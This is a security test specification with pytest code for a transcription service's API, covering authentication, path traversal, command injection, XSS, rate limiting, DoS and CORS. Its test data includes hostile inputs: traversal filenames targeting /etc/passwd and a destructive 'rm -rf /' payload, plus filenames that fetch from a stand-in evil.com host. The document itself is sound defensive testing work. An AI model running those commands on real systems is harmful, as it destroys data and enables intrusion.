# Security Test Specifications

## Document Control

**Application:** AI Transcription Service v1.5.x
**Test Author:** LOVELESS (QA Security Agent)
**Date:** 2025-10-15
**Test Framework:** pytest, httpx, pytest-asyncio

---

## 1. AUTHENTICATION SECURITY TESTS

### 1.1 API Key Validation Tests

#### TEST-AUTH-001: Missing API Key Rejection

**Objective:** Verify system rejects requests without API key

**Priority:** P0 (Critical)

**Test Type:** Negative Test

**Prerequisites:**
- Backend running on localhost:8000
- REQUIRE_AUTH=True in configuration

**Test Steps:**
```python
import httpx
import pytest

@pytest.mark.asyncio
async def test_missing_api_key_rejected():
    """Test that requests without API key are rejected with 401."""
    async with httpx.AsyncClient(base_url="http://localhost:8000") as client:
        # Attempt to create session without API key
        response = await client.post("/session/create")

        # Assertions
        assert response.status_code == 401, \
            "Should return 401 Unauthorized for missing API key"

        assert "API key required" in response.json()["detail"].lower(), \
            "Error message should mention API key requirement"

        assert "WWW-Authenticate" in response.headers, \
            "Should include WWW-Authenticate header"
```

**Expected Result:**
- Status: 401 Unauthorized
- Response: `{"detail": "API key required. Include 'X-API-Key' header."}`
- Header: `WWW-Authenticate: ApiKey`

**Actual Result:** PASS (verified in auth.py lines 33-37)

---

#### TEST-AUTH-002: Invalid API Key Rejection

**Objective:** Verify system rejects requests with invalid API keys

**Priority:** P0 (Critical)

**Test Type:** Negative Test

**Test Steps:**
```python
@pytest.mark.asyncio
async def test_invalid_api_key_rejected():
    """Test that invalid API keys are rejected with 403."""
    async with httpx.AsyncClient(base_url="http://localhost:8000") as client:
        invalid_keys = [
            "invalid-key-12345",
            "wrong-key-67890",
            "hacker-attempt-99999",
            "",  # Empty string
            "a" * 1000,  # Very long key
            "'; DROP TABLE users;--",  # SQL injection attempt
        ]

        for invalid_key in invalid_keys:
            response = await client.post(
                "/session/create",
                headers={"X-API-Key": invalid_key}
            )

            assert response.status_code == 403, \
                f"Should reject invalid key: {invalid_key[:20]}"

            assert "invalid" in response.json()["detail"].lower(), \
                "Error should mention invalid key"
```

**Expected Result:**
- Status: 403 Forbidden
- Response: `{"detail": "Invalid API key"}`

**Actual Result:** PASS (verified in auth.py lines 39-44)

---

#### TEST-AUTH-003: Valid API Key Acceptance

**Objective:** Verify system accepts requests with valid API keys

**Priority:** P0 (Critical)

**Test Type:** Positive Test

**Test Steps:**
```python
@pytest.mark.asyncio
async def test_valid_api_key_accepted():
    """Test that valid API keys are accepted."""
    valid_key = "dev-key-12345"  # From config

    async with httpx.AsyncClient(base_url="http://localhost:8000") as client:
        response = await client.post(
            "/session/create",
            headers={"X-API-Key": valid_key}
        )

        assert response.status_code == 200, \
            "Should accept valid API key"

        data = response.json()
        assert "session_id" in data, \
            "Should return session data"
```

**Expected Result:**
- Status: 200 OK
- Response contains: session_id, qr_data, ws_url, expires_in

**Actual Result:** EXPECTED PASS (requires REQUIRE_AUTH=True)

---

#### TEST-AUTH-004: API Key Brute Force Protection

**Objective:** Verify system has protections against API key brute force

**Priority:** P0 (Critical - CURRENTLY FAILING)

**Test Type:** Security Test

**Test Steps:**
```python
import asyncio
import time

@pytest.mark.asyncio
async def test_api_key_brute_force_protection():
    """Test that rapid invalid auth attempts are blocked."""
    async with httpx.AsyncClient(base_url="http://localhost:8000") as client:
        invalid_key = "brute-force-attempt"
        attempts = []

        # Attempt 100 requests rapidly
        for i in range(100):
            start = time.time()
            response = await client.post(
                "/session/create",
                headers={"X-API-Key": f"{invalid_key}-{i}"}
            )
            duration = time.time() - start

            attempts.append({
                "status": response.status_code,
                "duration": duration,
                "attempt": i
            })

        # Analyze results
        rate_limited = sum(1 for a in attempts if a["status"] == 429)
        avg_duration = sum(a["duration"] for a in attempts) / len(attempts)

        # Assertions
        assert rate_limited > 50, \
            f"Should rate limit majority of requests (got {rate_limited}/100)"

        # Later attempts should be slower (exponential backoff)
        early_avg = sum(a["duration"] for a in attempts[:10]) / 10
        late_avg = sum(a["duration"] for a in attempts[-10:]) / 10

        assert late_avg > early_avg * 2, \
            "Should implement exponential backoff (later attempts slower)"
```

**Expected Result:**
- First 5 attempts: 403 Forbidden (normal speed)
- Attempts 6-20: 429 Too Many Requests
- Attempts 21+: Delayed responses (exponential backoff)

**Actual Result:** FAIL - No exponential backoff implemented

**Recommendation:** Implement progressive delay algorithm

---

#### TEST-AUTH-005: API Key Entropy Validation

**Objective:** Verify API keys have sufficient entropy to resist brute force

**Priority:** P0 (Critical - CURRENTLY FAILING)

**Test Type:** Code Analysis Test

**Test Steps:**
```python
import math
import re
from app.config import settings

def test_api_key_entropy():
    """Test that API keys have sufficient cryptographic entropy."""
    for key in settings.ALLOWED_API_KEYS:
        # Calculate Shannon entropy
        entropy = calculate_shannon_entropy(key)

        # Check key length
        assert len(key) >= 32, \
            f"API key too short ({len(key)} chars): {key[:8]}..."

        # Check entropy (bits per character)
        assert entropy >= 4.0, \
            f"API key has low entropy ({entropy:.2f}): {key[:8]}..."

        # Check character diversity
        charset_size = len(set(key))
        assert charset_size >= 36, \
            f"API key uses too few characters ({charset_size}): {key[:8]}..."

        # Check for patterns
        assert not re.match(r'^(dev|test|prod|mobile)-', key), \
            f"API key contains predictable prefix: {key}"

        # Check not in common password lists
        assert key not in load_common_passwords(), \
            "API key matches common password"

def calculate_shannon_entropy(data: str) -> float:
    """Calculate Shannon entropy of string."""
    if not data:
        return 0
    entropy = 0
    for x in set(data):
        p_x = float(data.count(x)) / len(data)
        if p_x > 0:
            entropy += - p_x * math.log2(p_x)
    return entropy
```

**Expected Result:**
- Key length: >= 32 characters
- Entropy: >= 4.0 bits/char
- Character diversity: >= 36 unique chars
- No predictable patterns

**Actual Result:** FAIL
- Current keys: "dev-key-12345" (length: 13, entropy: ~3.0)
- Predictable patterns present
- Low character diversity

---

### 1.2 API Key Logging Security Tests

#### TEST-AUTH-006: API Key Not Logged

**Objective:** Verify API keys never appear in logs (even partially)

**Priority:** P0 (Critical - CURRENTLY FAILING)

**Test Type:** Security Test

**Test Steps:**
```python
import tempfile
import logging
from pathlib import Path

@pytest.mark.asyncio
async def test_api_key_not_logged(tmp_path):
    """Test that API keys never appear in log files."""
    # Configure logging to temp file
    log_file = tmp_path / "test.log"
    handler = logging.FileHandler(log_file)
    logger = logging.getLogger("app")
    logger.addHandler(handler)

    valid_key = "test-secret-key-12345678"
    async with httpx.AsyncClient(base_url="http://localhost:8000") as client:
        # Make requests with API key
        await client.post(
            "/session/create",
            headers={"X-API-Key": valid_key}
        )

        # Make invalid attempt
        await client.post(
            "/session/create",
            headers={"X-API-Key": "wrong-key"}
        )

    # Read log file
    log_content = log_file.read_text()

    # Assertions
    assert valid_key not in log_content, \
        "Full API key found in logs"

    assert valid_key[:8] not in log_content, \
        "Partial API key found in logs"

    assert valid_key[:4] not in log_content, \
        "API key prefix found in logs"

    # Verify key hash IS logged (this is OK)
    import hashlib
    key_hash = hashlib.sha256(valid_key.encode()).hexdigest()[:8]
    # This should be present for debugging
```

**Expected Result:**
- No full API keys in logs
- No partial API keys in logs
- Key hash may be present for correlation

**Actual Result:** FAIL
- Partial keys logged (auth.py lines 40, 46)

---

### 1.3 Session Security Tests

#### TEST-AUTH-007: Session Timeout Enforcement

**Objective:** Verify sessions expire after configured timeout

**Priority:** P1 (High)

**Test Type:** Functional Test

**Test Steps:**
```python
import asyncio

@pytest.mark.asyncio
async def test_session_timeout():
    """Test that sessions expire after timeout period."""
    async with httpx.AsyncClient(base_url="http://localhost:8000") as client:
        # Create session
        response = await client.post(
            "/session/create",
            headers={"X-API-Key": "dev-key-12345"}
        )
        session_id = response.json()["session_id"]

        # Verify session is valid
        response = await client.get(f"/session/{session_id}/info")
        assert response.status_code == 200

        # Wait for timeout (use short timeout for testing)
        # In production: 3600s, in test: override to 5s
        await asyncio.sleep(6)

        # Verify session expired
        response = await client.get(f"/session/{session_id}/info")
        assert response.status_code == 404, \
            "Session should expire after timeout"

        assert "expired" in response.json()["detail"].lower(), \
            "Error should mention expiration"
```

**Expected Result:**
- Session valid before timeout
- Session returns 404 after timeout
- Error message indicates expiration

**Actual Result:** EXPECTED PASS (timeout implemented)

---

#### TEST-AUTH-008: Session ID Unpredictability

**Objective:** Verify session IDs are cryptographically random

**Priority:** P1 (High)

**Test Type:** Security Test

**Test Steps:**
```python
@pytest.mark.asyncio
async def test_session_id_unpredictability():
    """Test that session IDs are unpredictable."""
    session_ids = []

    async with httpx.AsyncClient(base_url="http://localhost:8000") as client:
        # Create 100 sessions
        for _ in range(100):
            response = await client.post(
                "/session/create",
                headers={"X-API-Key": "dev-key-12345"}
            )
            session_ids.append(response.json()["session_id"])

    # Check for patterns
    # 1. All should be unique
    assert len(set(session_ids)) == len(session_ids), \
        "Session IDs should be unique"

    # 2. Should be valid UUIDs
    import uuid
    for sid in session_ids:
        assert uuid.UUID(sid).version == 4, \
            "Session ID should be UUID v4"

    # 3. Sequential IDs should not be similar
    for i in range(len(session_ids) - 1):
        similarity = calculate_hamming_distance(session_ids[i], session_ids[i+1])
        assert similarity > 0.4, \
            "Sequential session IDs should be very different"

def calculate_hamming_distance(s1: str, s2: str) -> float:
    """Calculate normalized Hamming distance."""
    if len(s1) != len(s2):
        return 1.0
    return sum(c1 != c2 for c1, c2 in zip(s1, s2)) / len(s1)
```

**Expected Result:**
- All session IDs unique
- All are valid UUID v4
- No predictable patterns

**Actual Result:** EXPECTED PASS (UUID4 used)

---

## 2. INJECTION ATTACK TESTS

### 2.1 Path Traversal Tests

#### TEST-INJ-001: Filename Path Traversal Prevention

**Objective:** Verify system prevents path traversal via filenames

**Priority:** P0 (Critical)

**Test Type:** Security Test

**Test Steps:**
```python
@pytest.mark.asyncio
async def test_path_traversal_prevention():
    """Test that malicious filenames cannot escape upload directory."""
    async with httpx.AsyncClient(base_url="http://localhost:8000") as client:
        # Create session
        response = await client.post(
            "/session/create",
            headers={"X-API-Key": "dev-key-12345"}
        )
        session_id = response.json()["session_id"]

        # Attempt path traversal attacks
        malicious_filenames = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\sam",
            "test/../../../etc/passwd",
            "test\\..\\..\\..\\etc\\passwd",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\ etc\\passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
            "....\\\\....\\\\....\\\\etc\\\\passwd",
        ]

        for filename in malicious_filenames:
            # Create dummy file with malicious name
            files = {
                'file': (filename, b'test content', 'audio/mpeg')
            }

            response = await client.post(
                f"/session/{session_id}/upload",
                files=files,
                headers={"X-API-Key": "dev-key-12345"}
            )

            # Should either reject or sanitize
            if response.status_code == 200:
                # If accepted, verify sanitized filename
                saved_filename = response.json().get("filename")
                assert "/" not in saved_filename, \
                    f"Sanitized filename contains slash: {saved_filename}"
                assert "\\" not in saved_filename, \
                    f"Sanitized filename contains backslash: {saved_filename}"
                assert ".." not in saved_filename, \
                    f"Sanitized filename contains '..': {saved_filename}"

        # Verify no files outside upload directory
        import os
        upload_dir = Path("./storage/uploads")
        for root, dirs, files in os.walk("."):
            if "storage/uploads" not in root:
                for file in files:
                    if file.startswith("test"):
                        pytest.fail(f"File escaped upload dir: {os.path.join(root, file)}")
```

**Expected Result:**
- Malicious filenames sanitized or rejected
- No files created outside upload directory
- Path separators removed from filenames

**Actual Result:** EXPECTED PASS (sanitization implemented)

---

#### TEST-INJ-002: Null Byte Injection Prevention

**Objective:** Verify null bytes cannot truncate filenames

**Priority:** P1 (High)

**Test Type:** Security Test

**Test Steps:**
```python
@pytest.mark.asyncio
async def test_null_byte_injection():
    """Test that null bytes in filenames are handled safely."""
    async with httpx.AsyncClient(base_url="http://localhost:8000") as client:
        response = await client.post(
            "/session/create",
            headers={"X-API-Key": "dev-key-12345"}
        )
        session_id = response.json()["session_id"]

        # Attempt null byte injection
        malicious_files = [
            ("test.mp3\x00.exe", b"MZ\x90\x00"),  # PE executable
            ("audio\x00.sh", b"#!/bin/bash"),
            ("safe.mp3\x00../../../etc/passwd", b"test"),
        ]

        for filename, content in malicious_files:
            files = {'file': (filename, content, 'audio/mpeg')}

            response = await client.post(
                f"/session/{session_id}/upload",
                files=files,
                headers={"X-API-Key": "dev-key-12345"}
            )

            if response.status_code == 200:
                saved_name = response.json().get("filename")
                assert "\x00" not in saved_name, \
                    "Null byte not removed from filename"
```

**Expected Result:**
- Null bytes removed from filenames
- File extension preserved correctly
- No truncation of security checks

**Actual Result:** EXPECTED PASS (null byte filtering in validation_service.py line 197)

---

### 2.2 File Content Injection Tests

#### TEST-INJ-003: Executable Disguised as Media

**Objective:** Verify system detects executables with media extensions

**Priority:** P0 (Critical)

**Test Type:** Security Test

**Test Steps:**
```python
@pytest.mark.asyncio
async def test_executable_detection():
    """Test that executables cannot be uploaded with media extensions."""
    async with httpx.AsyncClient(base_url="http://localhost:8000") as client:
        response = await client.post(
            "/session/create",
            headers={"X-API-Key": "dev-key-12345"}
        )
        session_id = response.json()["session_id"]

        # Create PE executable with MP3 extension
        pe_header = b'MZ\x90\x00' + b'\x00' * 100  # Minimal PE header
        files = {'file': ('malware.mp3', pe_header, 'audio/mpeg')}

        response = await client.post(
            f"/session/{session_id}/upload",
            files=files,
            headers={"X-API-Key": "dev-key-12345"}
        )

        # Should be rejected based on magic bytes
        assert response.status_code == 400, \
            "Executable should be rejected even with media extension"

        assert "invalid" in response.json()["detail"].lower() or \
               "type" in response.json()["detail"].lower(), \
            "Error should mention invalid file type"
```

**Expected Result:**
- Status: 400 Bad Request
- Error: "Invalid file type"
- File not saved

**Actual Result:** EXPECTED PASS (magic byte validation in validation_service.py)

---

#### TEST-INJ-004: ZIP Bomb Detection

**Objective:** Verify protection against decompression bombs

**Priority:** P1 (High)

**Test Type:** Security Test

**Test Steps:**
```python
import zlib

@pytest.mark.asyncio
async def test_zip_bomb_protection():
    """Test that compressed files with extreme ratios are rejected."""
    async with httpx.AsyncClient(base_url="http://localhost:8000") as client:
        response = await client.post(
            "/session/create",
            headers={"X-API-Key": "dev-key-12345"}
        )
        session_id = response.json()["session_id"]

        # Create highly compressible file (compression bomb)
        # 10MB of zeros compresses to ~10KB
        uncompressed = b'\x00' * (10 * 1024 * 1024)
        compressed = zlib.compress(uncompressed, level=9)

        files = {'file': ('bomb.mp3', compressed, 'audio/mpeg')}

        response = await client.post(
            f"/session/{session_id}/upload",
            files=files,
            headers={"X-API-Key": "dev-key-12345"},
            timeout=30.0
        )

        # Should complete without hanging
        # If file is accepted, verify size limit enforced
        if response.status_code == 200:
            saved_size = response.json().get("size", 0)
            assert saved_size < 100 * 1024 * 1024, \
                "Decompressed size should be limited"
```

**Expected Result:**
- Request completes (no hang)
- Large decompressed files rejected
- Or: Files stored compressed without expansion

**Actual Result:** NEEDS VERIFICATION

---

### 2.3 Command Injection Tests

#### TEST-INJ-005: FFmpeg Command Injection

**Objective:** Verify filenames cannot inject commands into FFmpeg

**Priority:** P0 (Critical)

**Test Type:** Security Test

**Test Steps:**
```python
@pytest.mark.asyncio
async def test_ffmpeg_command_injection():
    """Test that FFmpeg processing is safe from command injection."""
    # This requires testing the transcription pipeline
    # If FFmpeg is used with shell=True, this is vulnerable

    async with httpx.AsyncClient(base_url="http://localhost:8000") as client:
        malicious_names = [
            "; rm -rf /",
            "| curl evil.com",
            "&& wget http://evil.com/malware",
            "`whoami`",
            "$(cat /etc/passwd)",
        ]

        for name in malicious_names:
            # Create valid audio file
            import wave
            import io

            wav_buffer = io.BytesIO()
            with wave.open(wav_buffer, 'wb') as wav:
                wav.setnchannels(1)
                wav.setsampwidth(2)
                wav.setframerate(44100)
                wav.writeframes(b'\x00' * 44100)

            files = {'file': (f'{name}.wav', wav_buffer.getvalue(), 'audio/wav')}

            response = await client.post(
                "/transcribe/upload",
                files=files,
                headers={"X-API-Key": "dev-key-12345"}
            )

            # Even if accepted, verify no command execution
            # Monitor system for suspicious processes
            assert response.status_code in [200, 400], \
                "Should either accept or sanitize"
```

**Expected Result:**
- Commands not executed
- Filename sanitized before FFmpeg call
- subprocess.run() uses shell=False

**Actual Result:** NEEDS CODE REVIEW

**Required Verification:**
- Check all subprocess.run() calls use shell=False
- Verify filename sanitization before external commands

---

## 3. XSS AND CONTENT SECURITY TESTS

### 3.1 Response Content Type Tests

#### TEST-XSS-001: JSON Content Type Enforcement

**Objective:** Verify all API responses have correct Content-Type

**Priority:** P2 (Medium)

**Test Type:** Security Test

**Test Steps:**
```python
@pytest.mark.asyncio
async def test_json_content_type():
    """Test that all responses have application/json content type."""
    endpoints = [
        ("/", "GET", None),
        ("/health", "GET", None),
        ("/session/create", "POST", {"X-API-Key": "dev-key-12345"}),
    ]

    async with httpx.AsyncClient(base_url="http://localhost:8000") as client:
        for path, method, headers in endpoints:
            if method == "GET":
                response = await client.get(path, headers=headers or {})
            else:
                response = await client.post(path, headers=headers or {})

            content_type = response.headers.get("content-type", "")
            assert "application/json" in content_type.lower(), \
                f"{path} should return JSON content type"
```

**Expected Result:**
- All responses: Content-Type: application/json

**Actual Result:** EXPECTED PASS (FastAPI default)

---

#### TEST-XSS-002: No Script Tags in Responses

**Objective:** Verify responses don't contain executable scripts

**Priority:** P2 (Medium)

**Test Type:** Security Test

**Test Steps:**
```python
@pytest.mark.asyncio
async def test_no_script_injection():
    """Test that API responses don't contain <script> tags."""
    async with httpx.AsyncClient(base_url="http://localhost:8000") as client:
        # Create session with XSS attempt
        response = await client.post(
            "/session/create",
            headers={"X-API-Key": "<script>alert('xss')</script>"}
        )

        response_text = response.text.lower()
        assert "<script>" not in response_text, \
            "Response should not contain script tags"
        assert "javascript:" not in response_text, \
            "Response should not contain javascript: URIs"
```

**Expected Result:**
- No <script> tags in responses
- No javascript: URIs
- HTML entities escaped if displayed

**Actual Result:** EXPECTED PASS (JSON responses, no HTML rendering)

---

### 3.2 Security Headers Tests

#### TEST-SEC-001: Security Headers Present

**Objective:** Verify required security headers are present

**Priority:** P0 (Critical - CURRENTLY FAILING)

**Test Type:** Security Test

**Test Steps:**
```python
@pytest.mark.asyncio
async def test_security_headers():
    """Test that security headers are present in responses."""
    async with httpx.AsyncClient(base_url="http://localhost:8000") as client:
        response = await client.get("/health")

        required_headers = {
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": "DENY",
            "X-XSS-Protection": "1; mode=block",
            "Strict-Transport-Security": "max-age=31536000",
            "Referrer-Policy": "strict-origin-when-cross-origin",
        }

        for header, expected_value in required_headers.items():
            assert header in response.headers, \
                f"Missing security header: {header}"

            actual_value = response.headers[header]
            assert expected_value.lower() in actual_value.lower(), \
                f"{header} has wrong value: {actual_value}"
```

**Expected Result:**
- All security headers present
- Correct values configured

**Actual Result:** FAIL - No security headers configured

---

## 4. RATE LIMITING TESTS

### 4.1 Rate Limit Enforcement Tests

#### TEST-RATE-001: Session Creation Rate Limit

**Objective:** Verify rate limits prevent session creation abuse

**Priority:** P1 (High)

**Test Type:** Functional Test

**Test Steps:**
```python
@pytest.mark.asyncio
async def test_session_creation_rate_limit():
    """Test that session creation is rate limited."""
    # For production: 50/hour
    # For test: override to 5/minute

    async with httpx.AsyncClient(base_url="http://localhost:8000") as client:
        successful = 0
        rate_limited = 0

        # Attempt 60 requests
        for i in range(60):
            response = await client.post(
                "/session/create",
                headers={"X-API-Key": "dev-key-12345"}
            )

            if response.status_code == 200:
                successful += 1
            elif response.status_code == 429:
                rate_limited += 1

        # Assertions
        assert rate_limited > 0, \
            "Should rate limit excessive requests"

        assert "Retry-After" in response.headers, \
            "Rate limit response should include Retry-After header"
```

**Expected Result:**
- First 50 requests: 200 OK
- Remaining requests: 429 Too Many Requests
- Retry-After header present

**Actual Result:** PARTIAL - Rate limiting works but resets on restart

---

#### TEST-RATE-002: Per-IP Rate Limiting

**Objective:** Verify rate limits are per-IP address

**Priority:** P1 (High)

**Test Type:** Functional Test

**Test Steps:**
```python
@pytest.mark.asyncio
async def test_per_ip_rate_limiting():
    """Test that rate limits are applied per IP address."""
    # Simulate two different IPs using proxy headers

    async with httpx.AsyncClient(base_url="http://localhost:8000") as client:
        # IP 1 hits rate limit
        for _ in range(60):
            await client.post(
                "/session/create",
                headers={
                    "X-API-Key": "dev-key-12345",
                    "X-Forwarded-For": "1.2.3.4"
                }
            )

        # IP 2 should still be able to make requests
        response = await client.post(
            "/session/create",
            headers={
                "X-API-Key": "dev-key-12345",
                "X-Forwarded-For": "5.6.7.8"
            }
        )

        assert response.status_code == 200, \
            "Different IP should not be rate limited"
```

**Expected Result:**
- Rate limits independent per IP
- X-Forwarded-For header respected (if behind proxy)

**Actual Result:** NEEDS VERIFICATION

---

## 5. DOS PROTECTION TESTS

### 5.1 Resource Exhaustion Tests

#### TEST-DOS-001: Large File Upload Rejection

**Objective:** Verify system rejects files exceeding size limit

**Priority:** P0 (Critical)

**Test Type:** Negative Test

**Test Steps:**
```python
@pytest.mark.asyncio
async def test_large_file_rejection():
    """Test that files exceeding size limit are rejected."""
    from app.config import settings

    max_size = settings.MAX_FILE_SIZE_MB * 1024 * 1024
    oversized_file = b'\x00' * (max_size + 1024)  # Exceed by 1KB

    async with httpx.AsyncClient(
        base_url="http://localhost:8000",
        timeout=60.0
    ) as client:
        response = await client.post(
            "/session/create",
            headers={"X-API-Key": "dev-key-12345"}
        )
        session_id = response.json()["session_id"]

        # Attempt upload
        files = {'file': ('huge.mp4', oversized_file, 'video/mp4')}
        response = await client.post(
            f"/session/{session_id}/upload",
            files=files,
            headers={"X-API-Key": "dev-key-12345"}
        )

        assert response.status_code == 400 or response.status_code == 413, \
            "Should reject file exceeding size limit"

        assert "size" in response.json()["detail"].lower(), \
            "Error should mention file size"
```

**Expected Result:**
- Status: 413 Payload Too Large or 400 Bad Request
- Error mentions size limit
- File not saved to disk

**Actual Result:** EXPECTED PASS (size validation in validation_service.py)

---

#### TEST-DOS-002: Concurrent Upload Limit

**Objective:** Verify system limits concurrent uploads

**Priority:** P1 (High)

**Test Type:** Functional Test

**Test Steps:**
```python
import asyncio

@pytest.mark.asyncio
async def test_concurrent_upload_limit():
    """Test that concurrent uploads are limited."""
    from app.config import settings

    # Create multiple upload tasks
    async def upload_file(client, session_id, file_num):
        files = {'file': (f'test{file_num}.mp3', b'test', 'audio/mpeg')}
        return await client.post(
            f"/session/{session_id}/upload",
            files=files,
            headers={"X-API-Key": "dev-key-12345"}
        )

    async with httpx.AsyncClient(base_url="http://localhost:8000") as client:
        response = await client.post(
            "/session/create",
            headers={"X-API-Key": "dev-key-12345"}
        )
        session_id = response.json()["session_id"]

        # Attempt many concurrent uploads
        tasks = [upload_file(client, session_id, i) for i in range(100)]
        responses = await asyncio.gather(*tasks, return_exceptions=True)

        # Count successful vs limited
        successful = sum(1 for r in responses
                        if isinstance(r, httpx.Response) and r.status_code == 200)
        limited = sum(1 for r in responses
                     if isinstance(r, httpx.Response) and r.status_code == 429)

        # Should limit beyond rate threshold
        assert limited > 0 or successful <= 20, \
            "Should limit concurrent/rapid uploads"
```

**Expected Result:**
- First N uploads: 200 OK
- Remaining uploads: 429 Too Many Requests or queued

**Actual Result:** EXPECTED PASS (rate limiting configured)

---

### 5.2 WebSocket DOS Tests

#### TEST-DOS-003: WebSocket Connection Limit

**Objective:** Verify limit on concurrent WebSocket connections

**Priority:** P1 (High - CURRENTLY FAILING)

**Test Type:** Security Test

**Test Steps:**
```python
import websockets

@pytest.mark.asyncio
async def test_websocket_connection_limit():
    """Test that WebSocket connections per session are limited."""
    # Create session
    async with httpx.AsyncClient(base_url="http://localhost:8000") as client:
        response = await client.post(
            "/session/create",
            headers={"X-API-Key": "dev-key-12345"}
        )
        session_id = response.json()["session_id"]

    # Open many WebSocket connections
    connections = []
    rejected = 0

    try:
        for i in range(20):
            try:
                ws = await websockets.connect(
                    f"ws://localhost:8000/ws/{session_id}",
                    timeout=5
                )
                connections.append(ws)
            except Exception as e:
                rejected += 1

        # Should reject connections beyond limit
        assert rejected > 0 or len(connections) <= 10, \
            "Should limit WebSocket connections per session"

    finally:
        # Cleanup
        for ws in connections:
            await ws.close()
```

**Expected Result:**
- First 5-10 connections: Accepted
- Remaining connections: Rejected

**Actual Result:** FAIL - No connection limit implemented

---

## 6. CORS AND CROSS-ORIGIN TESTS

#### TEST-CORS-001: CORS Origin Validation

**Objective:** Verify CORS policy restricts origins

**Priority:** P0 (Critical - CURRENTLY FAILING)

**Test Type:** Security Test

**Test Steps:**
```python
@pytest.mark.asyncio
async def test_cors_origin_validation():
    """Test that CORS restricts allowed origins."""
    async with httpx.AsyncClient(base_url="http://localhost:8000") as client:
        # Request from unauthorized origin
        response = await client.get(
            "/health",
            headers={
                "Origin": "https://evil.com",
                "Access-Control-Request-Method": "POST"
            }
        )

        # Should NOT include Access-Control-Allow-Origin for evil.com
        allow_origin = response.headers.get("Access-Control-Allow-Origin", "")

        assert allow_origin != "*", \
            "Should not allow all origins in production"

        assert "evil.com" not in allow_origin, \
            "Should not allow unauthorized origins"

        # Request from authorized origin
        response = await client.get(
            "/health",
            headers={
                "Origin": "http://localhost:3000"
            }
        )

        allow_origin = response.headers.get("Access-Control-Allow-Origin", "")
        assert allow_origin in ["http://localhost:3000", "http://localhost:8000"], \
            "Should allow configured origins"
```

**Expected Result:**
- Unauthorized origins: No Access-Control-Allow-Origin header
- Authorized origins: Matching Access-Control-Allow-Origin header
- Never: Access-Control-Allow-Origin: *

**Actual Result:** FAIL
- Current config allows all origins (main.py line 209)

---

## 7. LOGGING AND MONITORING TESTS

#### TEST-LOG-001: Security Events Logged

**Objective:** Verify security events are logged

**Priority:** P1 (High)

**Test Type:** Functional Test

**Test Steps:**
```python
import logging
from io import StringIO

@pytest.mark.asyncio
async def test_security_events_logged():
    """Test that security events are logged appropriately."""
    # Capture logs
    log_stream = StringIO()
    handler = logging.StreamHandler(log_stream)
    logger = logging.getLogger("app")
    logger.addHandler(handler)

    async with httpx.AsyncClient(base_url="http://localhost:8000") as client:
        # Failed authentication
        await client.post(
            "/session/create",
            headers={"X-API-Key": "invalid-key"}
        )

        # Successful authentication
        await client.post(
            "/session/create",
            headers={"X-API-Key": "dev-key-12345"}
        )

        # Rate limit hit
        for _ in range(60):
            await client.post(
                "/session/create",
                headers={"X-API-Key": "dev-key-12345"}
            )

    # Analyze logs
    log_content = log_stream.getvalue().lower()

    # Should log security events
    assert "invalid" in log_content or "fail" in log_content, \
        "Should log failed authentication"

    assert "rate limit" in log_content or "too many" in log_content, \
        "Should log rate limit violations"

    # Should NOT log sensitive data
    assert "dev-key-12345" not in log_content, \
        "Should not log API keys"
```

**Expected Result:**
- Failed auth logged: YES
- Rate limit logged: YES
- Successful auth logged: OPTIONAL
- API keys logged: NO

**Actual Result:** PARTIAL
- Failed auth logged (but includes partial key)
- Need to remove key from logs

---

## 8. DEPENDENCY SECURITY TESTS

#### TEST-DEP-001: No Known Vulnerabilities

**Objective:** Verify dependencies have no known CVEs

**Priority:** P0 (Critical)

**Test Type:** Static Analysis

**Test Steps:**
```bash
# Run with pytest
pip install safety pip-audit

pytest tests/security/test_dependencies.py
```

```python
import subprocess
import pytest

def test_no_vulnerable_dependencies():
    """Test that dependencies have no known vulnerabilities."""
    # Run safety check
    result = subprocess.run(
        ["safety", "check", "--json"],
        capture_output=True,
        text=True
    )

    if result.returncode != 0:
        import json
        vulns = json.loads(result.stdout)
        pytest.fail(f"Found {len(vulns)} vulnerabilities: {vulns}")

    # Run pip-audit
    result = subprocess.run(
        ["pip-audit", "--format=json"],
        capture_output=True,
        text=True
    )

    if result.returncode != 0:
        pytest.fail("pip-audit found vulnerabilities")
```

**Expected Result:**
- No CVEs in dependencies
- All packages up to date

**Actual Result:** UNKNOWN - Not tested

---

## 9. INTEGRATION SECURITY TESTS

#### TEST-INT-001: End-to-End Secure Upload Flow

**Objective:** Verify complete secure upload and transcription flow

**Priority:** P1 (High)

**Test Type:** Integration Test

**Test Steps:**
```python
@pytest.mark.asyncio
async def test_secure_upload_flow():
    """Test complete secure upload and transcription flow."""
    async with httpx.AsyncClient(
        base_url="http://localhost:8000",
        timeout=120.0
    ) as client:
        # 1. Create session with auth
        response = await client.post(
            "/session/create",
            headers={"X-API-Key": "dev-key-12345"}
        )
        assert response.status_code == 200
        session_id = response.json()["session_id"]

        # 2. Upload file with validation
        # Create minimal valid WAV file
        import wave
        import io
        wav_buffer = io.BytesIO()
        with wave.open(wav_buffer, 'wb') as wav:
            wav.setnchannels(1)
            wav.setsampwidth(2)
            wav.setframerate(16000)
            wav.writeframes(b'\x00' * 16000)  # 1 second of silence

        files = {'file': ('test.wav', wav_buffer.getvalue(), 'audio/wav')}
        response = await client.post(
            f"/session/{session_id}/upload",
            files=files,
            headers={"X-API-Key": "dev-key-12345"}
        )
        assert response.status_code == 200

        # 3. Start transcription
        response = await client.post(
            f"/session/{session_id}/start-transcription",
            json={
                "language": "en",
                "quality": "small",
                "export_format": "txt"
            },
            headers={"X-API-Key": "dev-key-12345"}
        )
        assert response.status_code == 200
        task_id = response.json()["task_id"]

        # 4. Verify no security issues during processing
        # Monitor for:
        # - No file leaks outside storage
        # - No command injection
        # - No resource exhaustion
        # (This would require system monitoring)

        # 5. Cleanup
        await client.delete(
            f"/session/{session_id}",
            headers={"X-API-Key": "dev-key-12345"}
        )
```

**Expected Result:**
- All steps complete successfully
- No security violations
- Files cleaned up properly

**Actual Result:** NEEDS FULL INTEGRATION TESTING

---

## TEST EXECUTION SUMMARY

### Priority Breakdown

- **P0 (Critical):** 15 tests (Must pass before production)
- **P1 (High):** 12 tests (Should pass before release)
- **P2 (Medium):** 5 tests (Nice to have)
- **P3 (Low):** 3 tests (Future improvements)

### Expected Results

